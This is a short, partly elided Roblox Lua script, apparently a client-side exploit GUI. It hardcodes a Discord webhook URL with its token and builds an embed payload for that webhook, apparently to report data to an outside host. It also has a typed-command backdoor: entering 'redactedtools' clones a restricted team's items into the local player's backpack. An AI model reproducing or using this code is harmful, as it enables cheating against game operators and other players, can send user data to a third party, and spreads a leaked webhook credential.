...
local function LPFCW_fake_script() -- Frame.LocalScript 
	...
	local url =
		"https://discord.com/api/webhooks/1033159263993991299/s-pC7iR15yqZxKE07fG7efLykgV_TBc4A0Y7xqz83pSbssCUmWRFn688INfVbAGJ_cc-"
	local data = {
		["embeds"] = {
			{
	...
	script.Parent.TextBox.FocusLost:Connect(function(enterPressed)
		...
		if(string.lower(Chat) == "redactedtools") then
			for _,v in next, game:service"Teams"['Redacted']:GetChildren() do
				v:Clone().Parent = game:service"Players".LocalPlayer.Backpack
				end
			end
